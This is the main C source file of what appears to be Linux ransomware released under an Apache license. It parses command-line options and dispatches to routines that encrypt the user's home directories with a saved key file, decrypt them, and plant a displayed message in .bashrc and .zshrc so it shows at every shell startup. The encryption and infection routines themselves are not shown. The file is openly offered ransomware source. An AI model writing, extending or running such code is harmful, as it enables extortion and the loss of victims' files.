/*
Copyright 2017 EinBaum

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

#include <stdlib.h>
#include <stdio.h>
#include <getopt.h>

#include "baumcommon.h"

#include "settings.h"
#include "infect.h"
#include "encrypt.h"

const char *rc_files[] = {".bashrc", ".zshrc", NULL};

void help(void) {
	printf("%s - %s\n\n", PROGRAM_NAME, PROGRAM_DESC);
	printf("Usage example:\n");
	printf("%s [(-h|--help)] [(-v|--verbose)] [(-V|--version)]"
		"[(-e|--encrypt) keyfile] [(-d|--decrypt) keyfile]"
		"[(-p|--print)] [(-i|--infect)]\n\n", PROGRAM_NAME);
	printf("Options:\n");
	printf("-h or --help: Displays this information.\n");
	printf("-V or --version: Displays the current version number.\n");
	printf("-v or --verbose: Verbose mode on.\n");
	printf("-t or --test: Do not delete or alter files.\n");
	printf("-e or --encrypt keyfile: Encrypt user home and save key file.\n");
	printf("-d or --decrypt keyfile: Decrypt user home using a key file.\n");
	printf("-p or --print: Display information (default).\n");
	printf("-i or --infect: Make -p information appear on startup.\n");
}

void version(void) {
	printf("%s\n", PROGRAM_NAME);
}

int print_info(void) {
	printf("\n\n%s\n\n", PRINT_INFO);
	return 0;
}

int main(int argc, char **argv) {
	char opt_help = 0;
	char opt_version = 0;
	char opt_encrypt = 0;
	char opt_decrypt = 0;
	char opt_print = 0;
	char opt_infect = 0;
	char opt_uninfect = 0;

	char *opt_encrypt_file = NULL;
	char *opt_decrypt_file = NULL;

	int next_option;
	const char* const short_options = "hVvte:d:piu";
	const struct option long_options[] =
	{
		{ "help",	0, NULL, 'h' },
		{ "version",	0, NULL, 'V' },
		{ "verbose",	0, NULL, 'v' },
		{ "test",	0, NULL, 't' },
		{ "encrypt",	1, NULL, 'e' },
		{ "decrypt",	1, NULL, 'd' },
		{ "print",	0, NULL, 'p' },
		{ "infect",	0, NULL, 'i' },
		{ "uninfect",	0, NULL, 'u' },
		{ NULL, 0, NULL, 0 }
	};

	while (1) {
		next_option = getopt_long(argc, argv,
			short_options, long_options, NULL);

		if (next_option == -1)
			break;

		switch (next_option) {
		case 'h':
			opt_help = 1;
			break;
		case 'V':
			opt_version = 1;
			break;
		case 'v':
			baumcommon_setverbose(1);
			break;
		case 't':
			baumcommon_settest(1);
			break;
		case 'e':
			opt_encrypt = 1;
			opt_encrypt_file = optarg;
			break;
		case 'd':
			opt_decrypt = 1;
			opt_decrypt_file = optarg;
			break;
		case 'p':
			opt_print = 1;
			break;
		case 'i':
			opt_infect = 1;
			break;
		case 'u':
			opt_uninfect = 1;
			break;
		case '?':
			return 1;
		default:
			return 1;
		}
	}

	if (opt_help) {
		help();
		return 0;
	}
	if (opt_version) {
		version();
		return 0;
	}

	int selected = (opt_encrypt + opt_decrypt
		+ opt_print + opt_infect + opt_uninfect);

	if (selected > 1) {
		fprintf(stderr, "Too many options selected.\n");
	} else if (selected == 0) {
		opt_print = 1;
	}

	if (opt_print) {
		return print_info();
	}
	if (opt_infect) {
		return baum_infect(rc_files);
	}
	if (opt_uninfect) {
		return baum_uninfect(rc_files);
	}
	if (opt_encrypt) {
		return baum_encrypt(DIRECTORIES,
			EXTENSION, opt_encrypt_file);
	}
	if (opt_decrypt) {
		return baum_decrypt(DIRECTORIES,
			EXTENSION, opt_decrypt_file);
	}

	return 0;
}
